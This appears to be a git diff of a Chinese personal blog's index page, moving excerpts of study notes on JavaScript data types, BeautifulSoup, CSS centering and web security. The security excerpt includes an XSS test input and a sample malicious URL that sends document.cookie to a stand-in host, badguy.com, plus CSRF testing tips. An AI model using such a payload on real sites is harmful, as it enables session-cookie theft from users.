@@ -171,6 +171,184 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-JavsScript学习笔记-基本属性" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/blog/2018/06/17/JavsScript学习笔记-基本属性/">JavaScript学习笔记-数据类型</a>
+    </h1>
+  
+
+        
+        <a href="/blog/2018/06/17/JavsScript学习笔记-基本属性/" class="archive-article-date">
+  	<time datetime="2018-06-17T03:33:55.092Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-06-17</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="JavaScript数据类型"><a href="#JavaScript数据类型" class="headerlink" title="JavaScript数据类型"></a>JavaScript数据类型</h2><p><a href="http://www.helloyzy.cn/2017/11/05/js%E7%B1%BB%E5%9E%8B/" target="_blank" rel="noopener">浅析JavaScript语言的类型</a></p>
+<h3 id="数字number"><a href="#数字number" class="headerlink" title="数字number"></a>数字number</h3><ol>
+<li>js中的Number类型使用的是双精度浮点型,也就是其他语言的double类型</li>
+<li><a href="https://juejin.im/post/5a6fce10f265da3e261c3c71" target="_blank" rel="noopener">JS number相加精度丢失</a></li>
+<li><code>var a = &#39;a&#39; - 1;</code>NaN</li>
+<li>NaN于自己不相等</li>
+<li><code>isNaN()</code>返回布尔值,内部会先使用<code>number()</code>转化</li>
+</ol>
+<h3 id="字符串string"><a href="#字符串string" class="headerlink" title="字符串string"></a>字符串string</h3><h4 id="字符串方法-不会修改原字符串"><a href="#字符串方法-不会修改原字符串" class="headerlink" title="字符串方法(不会修改原字符串)"></a>字符串方法(不会修改原字符串)</h4><ol>
+<li><code>str.length</code>只可读</li>
+<li><code>str[i]</code>不兼容IE6-7(str.charAt(i))</li>
+<li><code>str.indexOf(value, index)</code>从index位(默认为0)开始检索,返回第一个value的下标或-1</li>
+<li><code>str.lastIndexOf(value, index)</code>从最后一位开始检索,返回第一个value的下标或-1</li>
+<li><code>str.charAt(index)</code>返回执行序号的字符串</li>
+<li><code>str.charCodeAt(index)</code>返回执行序号下字符的ASCII码</li>
+<li><code>String.fromCharCode(80)</code>返回ASCII为80的字符</li>
+<li><code>str.substring( 起始序号-包含 , 结束序号-不包含 )</code>返回截取的字符串</li>
+<li><code>str.slice( 起始序号-包含 , 结束序号-不包含 )</code>返回截取的字符串,负数代表倒数的index</li>
+<li><code>str.substr( 起始序号-包含 , 截取长度 )</code>返回截取的字符串</li>
+<li><code>str.trim</code>去除首尾空格</li>
+<li><code>str.toUpperCase() / str.toLowerCase()</code><br><strong>以下方法可以使用正则</strong></li>
+<li><code>str.match(&#39;c&#39;)</code>返回c或null</li>
+<li><code>str.search(&#39;c&#39;)</code>返回str中第一个c的下标或-1</li>
+<li><code>str.replace(&#39;c&#39;,&#39;d&#39;)</code>只替换第一个(如果使用正则的全局匹配就可替换所有),返回替换后的str,</li>
+<li><code>str.split(&#39;c&#39;)</code>返回用c将str分割成的数组</li>
+</ol>
+<h3 id="布尔值boolean"><a href="#布尔值boolean" class="headerlink" title="布尔值boolean"></a>布尔值boolean</h3><h3 id="对象Object"><a href="#对象Object" class="headerlink" title="对象Object"></a>对象Object</h3><ol>
+<li>可以进行点操作的就是对象</li>
+<li>有js定义的属性,也有自定义对象的属性</li>
+<li>查看对象下的属性<ol>
+<li><code>for in</code><h4 id="节点对象-json-array-window-null…"><a href="#节点对象-json-array-window-null…" class="headerlink" title="节点对象,json,array,window,null…"></a>节点对象,json,array,window,null…</h4></li>
+</ol>
+</li>
+</ol>
+<h4 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h4><ol>
+<li>声明<ol>
+<li>直接量</li>
+<li>new形式</li>
+</ol>
+</li>
+<li>json中的this<ol>
+<li><code>var person = {&#39;name&#39;: this, &#39;a&#39;: function(){this}}</code></li>
+<li>name对应的this指window</li>
+<li>函数中的this指这个json</li>
+</ol>
+</li>
+<li>删除属性<ol>
+<li><code>delete person.name</code></li>
+</ol>
+</li>
+<li>in判断对象是否具有某种属性<ol>
+<li><code>&#39;name&#39; in person</code>返回布尔值</li>
+</ol>
+</li>
+<li>遍历json<ol>
+<li><code>for (var attr in json){}</code></li>
+</ol>
+</li>
+<li><code>JSON.parse(str) / JSON.stringify(obj)</code></li>
+</ol>
+<h4 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h4><h5 id="数组的方法"><a href="#数组的方法" class="headerlink" title="数组的方法"></a>数组的方法</h5><ol>
+<li><code>数组.length</code> 可读可写</li>
+<li><code>数组[序号]</code> 可读可写</li>
+<li><code>arr.unshift( 新数据1 , 新数据2 )</code><br> 功能: 在原数组开头添加新数据<br> 返回: 新数组的长度<br> 是否改变原数组: 是</li>
+<li><code>arr.push( 新数据1 , 新数据2 )</code><br> 功能: 在原数组最后添加新数据<br> 返回: 新数组的长度<br> 是否改变原数组: 是</li>
+<li><code>arr.shift()</code><br> 功能: 移除数组第一个成员<br> 返回: 移除的成员<br> 是否改变原数组: 是</li>
+<li><code>arr.pop()</code><br> 功能: 移除数组最后一个成员<br> 返回: 移除的成员<br> 是否改变原数组: 是</li>
+<li><code>arr.splice( a , b , c1 , c2 ... )</code><br> a: 开始的序号<br> b: 删除的个数<br> c: 填充的成员<br> 返回: 只返回删除的对象<br> 是否改变原数组: 是<br> 只填一个参数时: 表示从下标为0处开始删除x个</li>
+<li><code>arr.slice( a , b )</code><ol>
+<li>与字符串<code>splice</code>相同</li>
+<li>返回: 切割的数组</li>
+<li>是否改变原数组:  <strong>不会</strong></li>
+</ol>
+</li>
+<li><code>arr.sort(function(x,y){return x-y})</code><br> 功能: 对数字数组排序<pre><code>return x-y : 原数组升序
+return 小于0的数 : 原数组不变
+return y-x : 原数组倒序
+return 大于0的数 : 原数组反转
+</code></pre> 返回: 新数组<br> 是否改变原数组: 是</li>
+<li><code>arr.reverse()</code><br> 功能: 反转数组<br> 返回: 新数组<br> 是否改变原数组: 是</li>
+<li><code>数组1.concat( 数组2 , 数组3 )</code><br>功能: 拼接数组<br>返回: 新数组<br>是否改变原数组: 否</li>
+<li><code>arr.join( 字符串 )</code><br>功能: 将数组成员用参数字符串拼接成字符串<br>返回: 字符串<br>是否改变原数组: 否</li>
+<li><code>Array.isArray( 参数 )</code><br>功能: 判断参数是否为数组<br>返回: 布尔值</li>
+<li><p><code>arr.forEach(function(value,index,arr){})</code><br>功能: 遍历数组<br>是否改变原数组: 是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var arr = [1,3,2,5,3];</span><br><span class="line">var res = arr.forEach(function(a,b,c)&#123;</span><br><span class="line">      c[b] = ++a;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>arr.filter(function(value,index,arr){})</code><br>return 条件<br>功能: 筛选数组<br>返回: 新数组<br>内部函数返回布尔值<br>是否改变原数组: 否</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var arr = [1,3,2,5,3];</span><br><span class="line">var res = arr.filter(function(a)&#123;</span><br><span class="line">      return a&gt;=3;//筛选&gt;=3成员并组成数组返回</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>arr.map(function(value,index,arr){})</code><br>return 条件<br>功能: 判断成员是否满足条件<br>返回: 布尔值组成的新数组<br>return 运算 : 返回运算后的新数组<br>功能: 成员进行计算<br>返回: 运算后的新数组<br>是否改变原数组: 否<br>return 值: 将数组每一项替换成这个值并返回</p>
+</li>
+<li><code>arr.every(function(value,index,arr){})</code><br>return 条件<br>功能: 判断成员是否满足条件<br>返回: 所有成员满足条件则返回true,否则返回false<br>是否改变原数组: 否</li>
+<li><code>arr.some(function(value,index,arr){})</code><br>return 条件<br>功能: 判断成员是否满足条件<br>返回: 只要有一个成员满足条件则返回true,否则返回false<br>是否改变原数组: 否</li>
+</ol>
+<h3 id="未定义类型undefined"><a href="#未定义类型undefined" class="headerlink" title="未定义类型undefined"></a>未定义类型undefined</h3><h3 id="函数类型"><a href="#函数类型" class="headerlink" title="函数类型"></a>函数类型</h3>
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">JavaScript</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/blog/categories/JavaScript//" class="article-tag-list-link color1">JavaScript</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/blog/2018/06/17/JavsScript学习笔记-基本属性/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-爬虫学习" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -355,116 +533,6 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/blog/2018/06/17/git和github/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-BeautifulSoup常用api总结" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/blog/2018/06/16/BeautifulSoup常用api总结/">BeautifulSoup常用api</a>
-    </h1>
-  
-
-        
-        <a href="/blog/2018/06/16/BeautifulSoup常用api总结/" class="archive-article-date">
-  	<time datetime="2018-06-15T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-06-16</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="解析器"><a href="#解析器" class="headerlink" title="解析器"></a>解析器</h2><p>Beautiful Soup支持python标准库中的HTML解析器,还支持一些第三方的解析器,常见的解析器有<br>|解析器|使用方法|<br>|:-:|:-:|<br>|python标准库|BeautifulSoup(markup,’html.parser’)|<br>|lxml HTML解析器|BeautifulSoup(markup,’lxml’)|<br>|lxml XML解析器|BeautifulSoup(markup,’lxml’, ‘xml’)|<br>|html5lib|BeautifulSoup(markup,’html5lib’)|</p>
-<h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2><ol>
-<li><code>soup.p</code>获取第一个p标签</li>
-<li><code>soup.p.attrs[&#39;class&#39;]</code>或<code>soup.p[&#39;class&#39;]</code>获取第一个p标签的name属性的值</li>
-<li><code>soup.p.string</code>或<code>soup.p.text</code>获取标签的文本属性</li>
-<li><code>soup.p.children</code>获取第一个p标签的子元素(数组形式)</li>
-<li><code>soup.a.parent</code>获取第一个a标签的父元素</li>
-<li><code>soup.a.next_siblings</code>获取后面的所有兄弟元素,<code>soup.a.next_sibling</code>获取下一个兄弟元素,<code>soup.a.previous_siblings</code>相同</li>
-<li><code>soup.title</code>获取title的内容,<code>soup.title.name</code>获取标签名称<h2 id="标准选择器find"><a href="#标准选择器find" class="headerlink" title="标准选择器find"></a>标准选择器<code>find</code></h2></li>
-<li><code>find_all</code>返回列表(数组)<ol>
-<li><code>soup.find_all(&#39;ul&#39;)</code>获取所有ul标签以及每个ul标签的内部标签</li>
-<li><code>soup.find_all(attrs={&#39;name&#39;: &#39;xxx&#39;})</code>获取所有属性name为xxx的标签</li>
-<li><code>soup.find_all(text=&#39;xxx&#39;)</code>获取文本为xxx的标签</li>
-</ol>
-</li>
-<li><code>find(name, attrs, recursive, text, **kwargs)</code>返回第一个元素 </li>
-</ol>
-<h2 id="CSS选择器"><a href="#CSS选择器" class="headerlink" title="CSS选择器"></a>CSS选择器</h2><ol>
-<li><code>soup.select(&#39;ul&#39;)</code>返回所有ul标签</li>
-<li><code>soup.select(&#39;li&#39;)[0].get_text()</code>获取文本内容</li>
-<li><code>soup.select(&#39;ul&#39;)[0].attrs[&#39;id&#39;]</code>获取第一个ul的id属性值</li>
-</ol>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">爬虫</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">python</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/blog/categories/python//" class="article-tag-list-link color2">python</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/blog/2018/06/16/BeautifulSoup常用api总结/">展开全文 >></a>
         </p>
       
 
@@ -717,6 +785,116 @@
 
 
   
+    <article id="post-BeautifulSoup常用api总结" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/blog/2018/06/16/BeautifulSoup常用api总结/">BeautifulSoup常用api</a>
+    </h1>
+  
+
+        
+        <a href="/blog/2018/06/16/BeautifulSoup常用api总结/" class="archive-article-date">
+  	<time datetime="2018-06-15T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-06-16</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="解析器"><a href="#解析器" class="headerlink" title="解析器"></a>解析器</h2><p>Beautiful Soup支持python标准库中的HTML解析器,还支持一些第三方的解析器,常见的解析器有<br>|解析器|使用方法|<br>|:-:|:-:|<br>|python标准库|BeautifulSoup(markup,’html.parser’)|<br>|lxml HTML解析器|BeautifulSoup(markup,’lxml’)|<br>|lxml XML解析器|BeautifulSoup(markup,’lxml’, ‘xml’)|<br>|html5lib|BeautifulSoup(markup,’html5lib’)|</p>
+<h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2><ol>
+<li><code>soup.p</code>获取第一个p标签</li>
+<li><code>soup.p.attrs[&#39;class&#39;]</code>或<code>soup.p[&#39;class&#39;]</code>获取第一个p标签的name属性的值</li>
+<li><code>soup.p.string</code>或<code>soup.p.text</code>获取标签的文本属性</li>
+<li><code>soup.p.children</code>获取第一个p标签的子元素(数组形式)</li>
+<li><code>soup.a.parent</code>获取第一个a标签的父元素</li>
+<li><code>soup.a.next_siblings</code>获取后面的所有兄弟元素,<code>soup.a.next_sibling</code>获取下一个兄弟元素,<code>soup.a.previous_siblings</code>相同</li>
+<li><code>soup.title</code>获取title的内容,<code>soup.title.name</code>获取标签名称<h2 id="标准选择器find"><a href="#标准选择器find" class="headerlink" title="标准选择器find"></a>标准选择器<code>find</code></h2></li>
+<li><code>find_all</code>返回列表(数组)<ol>
+<li><code>soup.find_all(&#39;ul&#39;)</code>获取所有ul标签以及每个ul标签的内部标签</li>
+<li><code>soup.find_all(attrs={&#39;name&#39;: &#39;xxx&#39;})</code>获取所有属性name为xxx的标签</li>
+<li><code>soup.find_all(text=&#39;xxx&#39;)</code>获取文本为xxx的标签</li>
+</ol>
+</li>
+<li><code>find(name, attrs, recursive, text, **kwargs)</code>返回第一个元素 </li>
+</ol>
+<h2 id="CSS选择器"><a href="#CSS选择器" class="headerlink" title="CSS选择器"></a>CSS选择器</h2><ol>
+<li><code>soup.select(&#39;ul&#39;)</code>返回所有ul标签</li>
+<li><code>soup.select(&#39;li&#39;)[0].get_text()</code>获取文本内容</li>
+<li><code>soup.select(&#39;ul&#39;)[0].attrs[&#39;id&#39;]</code>获取第一个ul的id属性值</li>
+</ol>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">爬虫</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">python</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/blog/categories/python//" class="article-tag-list-link color2">python</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/blog/2018/06/16/BeautifulSoup常用api总结/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-python中正则的使用" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -799,6 +977,117 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/blog/2018/06/16/python中正则的使用/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-网络安全" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/blog/2018/06/12/网络安全/">网络安全</a>
+    </h1>
+  
+
+        
+        <a href="/blog/2018/06/12/网络安全/" class="archive-article-date">
+  	<time datetime="2018-06-11T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-06-12</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><h2 id="发生场景"><a href="#发生场景" class="headerlink" title="发生场景"></a>发生场景</h2><ol>
+<li>在input标签中输入 <code>&quot;/&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;!-</code>,因此输入的字符被浏览器解析成js代码执行</li>
+<li>恶意URL<code>http://victim.com/search.asp?term=&lt;script&gt;window.open(&quot;http://badguy.com?cookie=&quot;+document.cookie)&lt;/script&gt;</code><h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2></li>
+<li>将用户输入的字符进行HTML Encode转码</li>
+<li>input输入框只允许输入规定的字符<h2 id="测试XSS漏洞"><a href="#测试XSS漏洞" class="headerlink" title="测试XSS漏洞"></a>测试XSS漏洞</h2></li>
+<li>在input标签中输入 <code>&quot;/&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;!-</code></li>
+<li>高版本的浏览器通常有安全机制过滤XSS, 尽量使用低版本IE浏览器</li>
+</ol>
+<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><ol>
+<li>用户输入的字符被解析成SQL脚本运行</li>
+</ol>
+<h1 id="CSRF攻击"><a href="#CSRF攻击" class="headerlink" title="CSRF攻击"></a>CSRF攻击</h1><h2 id="发生场景-1"><a href="#发生场景-1" class="headerlink" title="发生场景"></a>发生场景</h2><ol>
+<li>受害者访问URL地址,在COOKIE和SEESION失效之前,继续访问这个网站的另一个危险URL地址,服务器则会把受害者的操作当做正常操作,因为COOKIE和SESSION未失效</li>
+</ol>
+<h2 id="测试CSRF漏洞"><a href="#测试CSRF漏洞" class="headerlink" title="测试CSRF漏洞"></a>测试CSRF漏洞</h2><ol>
+<li>抓取一个正常的包,去掉Refererz字段后重新提交,如果有效则可能有CSRF漏洞</li>
+<li>检测工具CSRFTester</li>
+</ol>
+<h2 id="解决-1"><a href="#解决-1" class="headerlink" title="解决"></a>解决</h2><ol>
+<li>请求必须校验referer字段</li>
+<li>在http请求中以参数的形式产生随机token,并在服务器校验这个token</li>
+<li>在http请求头中添加token值</li>
+</ol>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">网络</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">安全性测试</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/blog/categories/测试//" class="article-tag-list-link color3">测试</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/blog/2018/06/12/网络安全/">展开全文 >></a>
         </p>
       
 
@@ -971,117 +1260,6 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/blog/2018/06/12/OSI七层模型结构/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-网络安全" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/blog/2018/06/12/网络安全/">网络安全</a>
-    </h1>
-  
-
-        
-        <a href="/blog/2018/06/12/网络安全/" class="archive-article-date">
-  	<time datetime="2018-06-11T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-06-12</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><h2 id="发生场景"><a href="#发生场景" class="headerlink" title="发生场景"></a>发生场景</h2><ol>
-<li>在input标签中输入 <code>&quot;/&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;!-</code>,因此输入的字符被浏览器解析成js代码执行</li>
-<li>恶意URL<code>http://victim.com/search.asp?term=&lt;script&gt;window.open(&quot;http://badguy.com?cookie=&quot;+document.cookie)&lt;/script&gt;</code><h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2></li>
-<li>将用户输入的字符进行HTML Encode转码</li>
-<li>input输入框只允许输入规定的字符<h2 id="测试XSS漏洞"><a href="#测试XSS漏洞" class="headerlink" title="测试XSS漏洞"></a>测试XSS漏洞</h2></li>
-<li>在input标签中输入 <code>&quot;/&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;!-</code></li>
-<li>高版本的浏览器通常有安全机制过滤XSS, 尽量使用低版本IE浏览器</li>
-</ol>
-<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><ol>
-<li>用户输入的字符被解析成SQL脚本运行</li>
-</ol>
-<h1 id="CSRF攻击"><a href="#CSRF攻击" class="headerlink" title="CSRF攻击"></a>CSRF攻击</h1><h2 id="发生场景-1"><a href="#发生场景-1" class="headerlink" title="发生场景"></a>发生场景</h2><ol>
-<li>受害者访问URL地址,在COOKIE和SEESION失效之前,继续访问这个网站的另一个危险URL地址,服务器则会把受害者的操作当做正常操作,因为COOKIE和SESSION未失效</li>
-</ol>
-<h2 id="测试CSRF漏洞"><a href="#测试CSRF漏洞" class="headerlink" title="测试CSRF漏洞"></a>测试CSRF漏洞</h2><ol>
-<li>抓取一个正常的包,去掉Refererz字段后重新提交,如果有效则可能有CSRF漏洞</li>
-<li>检测工具CSRFTester</li>
-</ol>
-<h2 id="解决-1"><a href="#解决-1" class="headerlink" title="解决"></a>解决</h2><ol>
-<li>请求必须校验referer字段</li>
-<li>在http请求中以参数的形式产生随机token,并在服务器校验这个token</li>
-<li>在http请求头中添加token值</li>
-</ol>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">网络</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">安全性测试</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/blog/categories/测试//" class="article-tag-list-link color3">测试</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/blog/2018/06/12/网络安全/">展开全文 >></a>
         </p>
       
 
@@ -1301,99 +1479,6 @@
 
 
   
-    <article id="post-HTML学习笔记(4)-水平垂直居中的几种方法" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/blog/2018/02/05/HTML学习笔记(4)-水平垂直居中的几种方法/">水平垂直居中的几种方法</a>
-    </h1>
-  
-
-        
-        <a href="/blog/2018/02/05/HTML学习笔记(4)-水平垂直居中的几种方法/" class="archive-article-date">
-  	<time datetime="2018-02-04T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-02-05</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="第一种方法-子级添加transform"><a href="#第一种方法-子级添加transform" class="headerlink" title="第一种方法 子级添加transform"></a>第一种方法 子级添加transform</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">父级</span><br><span class="line">position: relative</span><br><span class="line">子级</span><br><span class="line">position: absolute;</span><br><span class="line">top: 50%;</span><br><span class="line">left: 50%;</span><br><span class="line">transform: translate(-50%,-50%);</span><br></pre></td></tr></table></figure>
-<h2 id="第二种方法-flex布局"><a href="#第二种方法-flex布局" class="headerlink" title="第二种方法 flex布局"></a>第二种方法 flex布局</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">父级</span><br><span class="line">display: flex;</span><br><span class="line">justify-content: center;</span><br><span class="line">align-items: center</span><br></pre></td></tr></table></figure>
-<h2 id="第三种方法-定位-margin"><a href="#第三种方法-定位-margin" class="headerlink" title="第三种方法 定位+margin"></a>第三种方法 定位+margin</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">父级</span><br><span class="line">position: relative;</span><br><span class="line">子级</span><br><span class="line">position: absolute;</span><br><span class="line">top: 0;bottom: 0;left: 0;right: 0;</span><br><span class="line">margin: auto;</span><br></pre></td></tr></table></figure>
